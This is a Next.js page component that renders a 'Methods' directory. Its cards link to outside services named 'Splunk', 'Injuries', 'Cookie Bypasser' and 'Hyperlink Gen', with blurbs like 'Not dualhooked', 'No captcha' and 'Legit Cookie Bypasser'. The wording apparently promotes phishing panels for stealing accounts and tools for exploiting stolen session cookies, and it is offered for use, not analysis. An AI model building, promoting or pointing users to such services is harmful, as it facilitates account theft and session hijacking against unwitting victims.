import Link from 'next/link'
import ParticleBackground from '../components/ParticleBackground'
import OurDiscordButton from '../components/OurDiscordButton'
import BrightnessSlider from '../components/BrightnessSlider'
import MethodCard from '../components/MethodCard'

const METHODS = [
  {
    name: "Splunk",
    link: "https://app.splunk.gg/u/exmadeGG",
    desc: ["Not dualhooked","Fast login","No captcha"]
  },
  {
    name: "Injuries",
    link: "https://www.logged.tg/auth/exmade",
    desc: ["Not dualhooked","Fast login","No captcha"]
  },
  {
    name: "Cookie Bypasser",
    link: "https://app.splunk.gg/u/exmadeGG",
    desc: ["Safe.","Not dualhooked.","Legit Cookie Bypasser"]
  },
  {
    name: "Hyperlink Gen",
    link: "https://dsprs.vercel.app/hyperlink",
    desc: ["Safe.","Virus Safe.","No cookie."]
  }
];

export default function MethodsPage(){
  return (
    <div className="relative min-h-screen">
      <ParticleBackground />
      <OurDiscordButton />
      <div className="fixed top-4 right-4 z-50"><BrightnessSlider /></div>

      <div className="relative z-40 max-w-6xl mx-auto px-6 py-10">
        <Link href="/" legacyBehavior><a className="inline-block mb-6 btn-primary">← Back</a></Link>
        <h1 className="neon text-4xl font-extrabold mb-8">Methods</h1>

        <div className="grid gap-6 grid-cols-1 md:grid-cols-2">
          {METHODS.map((m) => <MethodCard key={m.name} {...m} />)}
        </div>
      </div>
    </div>
  )
}
